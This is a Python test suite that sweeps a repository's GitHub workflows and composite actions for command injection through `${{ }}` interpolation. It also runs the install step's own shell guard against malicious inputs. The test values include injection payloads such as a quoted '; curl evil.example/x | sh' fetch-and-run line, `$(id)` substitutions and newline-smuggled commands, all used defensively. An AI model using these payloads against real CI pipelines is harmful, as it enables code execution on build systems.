"""No externally controlled value is interpolated into a shell body — register entry N16.

GitHub splices a `${{ }}` expression into the script TEXT before bash ever sees it. A value
carrying a quote or a semicolon therefore stops being data and becomes script. The safe form
is an `env:` binding, where the value reaches bash as a variable.

The finding this file closes stood one line above its own solution: the action's run step
routed `inputs.command` through `env:` and said why in a comment, while the step directly
above interpolated `inputs.version` and `inputs.extras` into the shell body.

So this is a SWEEP, not a case about one file: every action and every workflow in the tree
is examined, because a fix that only covers the place the finding named leaves its
neighbours open — and the neighbour here was one step away.
"""
import os
import re
import subprocess
import unittest
from pathlib import Path

import yaml

REPO = Path(__file__).resolve().parents[1]

# Expression prefixes an attacker can influence. `github.event.*` and `inputs.*` are the
# two GitHub's own hardening guidance names first; `head_ref` is the classic pull-request
# case, where a branch name is attacker-chosen text.
GEFAEHRLICH = re.compile(
    r"\$\{\{\s*(inputs\.|github\.event\.|github\.head_ref|env\.GITHUB_HEAD_REF)", re.I)

# NAMED LIMIT of this set, measured rather than assumed. `steps.*.outputs.`, `needs.*.outputs.` and
# `github.actor` are NOT in it. A counter-reading of this tree extended the set and found four more
# sites, all in .github/workflows/release.yml (258, 385, 387, 388) and all harmless by origin: one
# is an output of the SHA-pinned attest-build-provenance action, three are hex digests from
# sha256sum. Widening the set here would therefore turn this sweep red on four sites that carry no
# defect, and the usual answer to that — an exception list — is the shape that later lets
# everything through. Widening the set is a decision of its own and is carried as an open entry in
# the findings register rather than settled here under landing pressure. So: a value that reaches
# a `run:` body through a step output is not caught by this sweep, and this comment is where that
# is said out loud instead of being discovered later.


# Directories that hold no action of ours. A sweep that walks them wastes time and can pick up a
# vendored workflow, which would be reported as if it were ours.
FREMD = (".git", ".venv", "venv", "node_modules", "build", "dist", ".mypy_cache", ".pytest_cache")


def yaml_dateien() -> list[Path]:
    """Every workflow and every composite action in the tree, found by SHAPE, not by one fixed path.

    The first version looked in `action/` and `.github/workflows/` and nowhere else. A composite
    action lives wherever somebody puts it, and `.github/actions/<name>/action.yml` is the usual
    second place. A sweep that never enters a directory says nothing about it while looking green,
    and nothing in the suite would report that the new directory is unseen. Measured on this tree:
    14 YAML files, 11 inside the two fixed paths, 3 outside them and none of those three carrying a
    `run:` body — so today the fixed paths lose nothing. The gap is in the rule, not in the count.
    """
    d: set[Path] = set()
    wf = REPO / ".github" / "workflows"
    if wf.is_dir():
        d |= set(wf.rglob("*.yml")) | set(wf.rglob("*.yaml"))
    for name in ("action.yml", "action.yaml"):
        d |= {p for p in REPO.rglob(name)
              if not any(teil in FREMD for teil in p.relative_to(REPO).parts)}
    return sorted(d)


def run_bloecke(datei: Path):
    """Yield (step name, run body) for every step that carries a shell body."""
    try:
        doc = yaml.safe_load(datei.read_text(encoding="utf-8"))
    except yaml.YAMLError as exc:
        raise AssertionError(f"{datei} is not valid YAML: {exc}") from exc
    if not isinstance(doc, dict):
        return
    schritte = []
    runs = doc.get("runs")
    if isinstance(runs, dict):
        schritte += runs.get("steps") or []
    for job in (doc.get("jobs") or {}).values():
        if isinstance(job, dict):
            schritte += job.get("steps") or []
    for s in schritte:
        if isinstance(s, dict) and isinstance(s.get("run"), str):
            yield s.get("name", "(unnamed)"), s["run"]


class TestKeineEinspeisungInEinenShellBody(unittest.TestCase):
    def test_es_gibt_ueberhaupt_etwas_zu_pruefen(self):
        """A sweep over an empty set is green and says nothing."""
        dateien = yaml_dateien()
        self.assertGreater(len(dateien), 1, "no action or workflow files found to sweep")
        # SPECIFIC, NOT MERELY NON-EMPTY. `len > 1` still holds after the one file this finding is
        # about is deleted or moved, and the sweep would then be green over everything except the
        # instance it exists for.
        self.assertIn(REPO / "action" / "action.yml", dateien,
                      "the composite action this finding is about is not in the swept set")
        self.assertTrue(any(any(True for _ in run_bloecke(d)) for d in dateien),
                        "no run blocks found — the sweep would pass vacuously")

    def test_KEINE_datei_interpoliert_eine_fremde_eingabe_in_einen_run_body(self):
        treffer = []
        for d in yaml_dateien():
            for name, body in run_bloecke(d):
                for m in GEFAEHRLICH.finditer(body):
                    zeile = body[:m.start()].count("\n") + 1
                    treffer.append(f"{d.relative_to(REPO)} · step {name!r} · run line {zeile}: "
                                   f"{m.group(0)}…")
        self.assertEqual(treffer, [], "externally controlled value interpolated into a shell "
                                      "body — route it through env: instead:\n  " +
                                      "\n  ".join(treffer))

    def test_die_action_fuehrt_ihre_drei_eingaben_ueber_env(self):
        """The specific instance, bound by effect rather than by reading the comment."""
        doc = yaml.safe_load((REPO / "action" / "action.yml").read_text(encoding="utf-8"))
        env_werte = set()
        for s in doc["runs"]["steps"]:
            for v in (s.get("env") or {}).values():
                env_werte.add(str(v))
        for feld in ("inputs.command", "inputs.version", "inputs.extras"):
            self.assertTrue(any(feld in v for v in env_werte),
                            f"{feld} does not travel through any env binding")

    def test_META_der_sweep_faengt_eine_eingepflanzte_einspeisung(self):
        """Without this the sweep could be green because its pattern matches nothing.

        An absence check that has never seen a presence cannot be told from one that
        always passes.
        """
        gepflanzt = 'echo "${{ inputs.version }}"'
        self.assertTrue(GEFAEHRLICH.search(gepflanzt))
        for harmlos in ('echo "${{ github.sha }}"',
                        'echo "$PB_VERSION"',
                        'echo "${{ runner.os }}"'):
            with self.subTest(harmlos=harmlos):
                self.assertIsNone(GEFAEHRLICH.search(harmlos),
                                  "a value the attacker does not control must not be flagged")


# The shape check is exercised BY RUNNING IT, not by re-implementing it.
#
# Two earlier versions of this file each got one layer of this wrong. The first held its own typed
# copies of both patterns: weaken the pattern in the action and leave the error strings alone, and
# every test stayed green — a guarantee about a stand-in. The second read the patterns out of the
# action but still applied them with Python's `re`, and that is a DIFFERENT ENGINE from the one the
# step used. Measured: with the value `==1.0.0` followed by a newline and `"; curl evil.example|sh #`,
# `grep -Eq '^...$'` returned 0 and accepted it, because grep anchors per line, while `re.search`
# with the same pattern rejected it. One pattern, two engines, opposite verdicts — and the test
# reported the engine that was not running.
#
# So the tests below execute the step's own `run:` body, with `python` shadowed so no install
# happens. A refusal is then the step's refusal, measured, and no second implementation of the rule
# exists to drift.
_RE_ZEILE = re.compile(r"^\s*(?P<var>PB_[A-Z]+_RE)='(?P<muster>[^']+)'\s*$", re.M)


def install_rumpf() -> str:
    """The `run:` body of the install step, as the runner would execute it."""
    doc = yaml.safe_load((REPO / "action" / "action.yml").read_text(encoding="utf-8"))
    for s in doc["runs"]["steps"]:
        if s.get("name") == "Install proofbundle":
            return s["run"]
    raise AssertionError("the install step is gone or was renamed — this file tests nothing")


def action_muster() -> dict[str, str]:
    """The patterns the step declares, keyed by their variable name."""
    return {m.group("var"): m.group("muster") for m in _RE_ZEILE.finditer(install_rumpf())}


def schritt_weist_ab(**werte: str) -> bool:
    """True when the step REFUSES these inputs. Runs the real body, installs nothing."""
    rumpf = install_rumpf()
    # A shell function shadows the command, so `python -m pip install ...` is a no-op and the exit
    # code carries the verdict of the guard rather than the state of the network.
    r = subprocess.run(["bash", "-c", "python() { :; }\n" + rumpf],
                       env={**os.environ, "PB_VERSION": "", "PB_EXTRAS": "", **werte},
                       capture_output=True, text=True)
    return r.returncode != 0


class TestFormpruefungDerEingaben(unittest.TestCase):
    """env: alone is secure only until someone rewrites the step. The shape check survives."""

    def test_beide_muster_sind_ueberhaupt_auffindbar(self):
        """Without this the value cases below could pass over a step that checks nothing."""
        self.assertEqual(sorted(action_muster()), ["PB_EXTRAS_RE", "PB_VERSION_RE"],
                         "the step no longer declares both shape patterns, or it was rewritten in "
                         "a form this reader does not recognise")

    def test_die_action_prueft_beide_eingaben_auf_ihre_form(self):
        rumpf = install_rumpf()
        self.assertIn("is not a PEP 440 specifier", rumpf)
        self.assertIn("is not a comma-separated list of names", rumpf)

    def test_echte_werte_kommen_durch(self):
        """A guard that refuses everything is not a guard, it is an outage."""
        for gut in ("==6.0.0", ">=6.0", "~=6.0.1", "==6.0.0rc1", "==1.*", ""):
            with self.subTest(version=gut):
                self.assertFalse(schritt_weist_ab(PB_VERSION=gut),
                                 f"the step refuses the legitimate version {gut!r}")
        for gut in ("eval", "eval,inspect", "dev-tools", ""):
            with self.subTest(extras=gut):
                self.assertFalse(schritt_weist_ab(PB_EXTRAS=gut),
                                 f"the step refuses the legitimate extras {gut!r}")

    def test_die_einspeisung_wird_abgewiesen(self):
        for boese in ('==1.0.0"; curl evil.example/x | sh; echo "',
                      "==1.0.0 $(id)", "==1.0.0`id`", "; id"):
            with self.subTest(version=boese):
                self.assertTrue(schritt_weist_ab(PB_VERSION=boese))
        for boese in ("eval; id", "eval$(id)", "eval inspect", "eval,"):
            with self.subTest(extras=boese):
                self.assertTrue(schritt_weist_ab(PB_EXTRAS=boese))

    def test_ein_wert_dessen_ERSTE_zeile_passt_kommt_nicht_durch(self):
        """The line-wise anchor. `grep -Eq '^...$'` accepted every one of these."""
        for boese in ('==1.0.0\n"; curl evil.example/x | sh #',
                      "==1.0.0\nid",
                      "==1.0.0\n\n$(id)"):
            with self.subTest(version=boese):
                self.assertTrue(schritt_weist_ab(PB_VERSION=boese),
                                "a value whose first line matches is still not the value")
        for boese in ("eval\nwhatever$(id)", "eval\n; id"):
            with self.subTest(extras=boese):
                self.assertTrue(schritt_weist_ab(PB_EXTRAS=boese))

    def test_ein_extra_faengt_nicht_mit_einem_bindestrich_an(self):
        """`-e` and `--no-deps` read as options, and an extras list admits neither."""
        for boese in ("-e", "eval,--no-deps", "-", "_eval"):
            with self.subTest(extras=boese):
                self.assertTrue(schritt_weist_ab(PB_EXTRAS=boese))


if __name__ == "__main__":
    unittest.main(verbosity=2)
